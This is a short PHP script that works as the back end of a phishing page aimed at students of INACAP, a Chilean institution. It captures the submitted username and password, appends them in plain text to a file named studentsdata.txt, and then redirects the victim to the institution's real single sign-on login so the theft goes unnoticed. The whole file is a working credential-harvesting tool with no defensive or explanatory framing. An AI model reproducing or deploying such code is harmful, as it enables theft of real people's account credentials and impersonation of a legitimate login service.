<?php
    $email = $_POST["UserName"];
    $pass = $_POST["Password"];

    $texto = "
    username: $email
    password: $pass
    ---------------------------------
    ";

    file_put_contents("studentsdata.txt", $texto, FILE_APPEND);

    header("Location: https://adfs.inacap.cl/adfs/ls/?wtrealm=https://siga.inacap.cl/sts/&wa=wsignin1.0&wreply=https://siga.inacap.cl/sts/&wctx=https%3a%2f%2fadfs.inacap.cl%2fadfs%2fls%2f%3fwreply%3dhttps%3a%2f%2fintranet.inacap.cl%2ftportalvp%2falumnos-intranet%26wtrealm%3dhttps%3a%2f%2fintranet.inacap.cl%2f");
    exit();
?>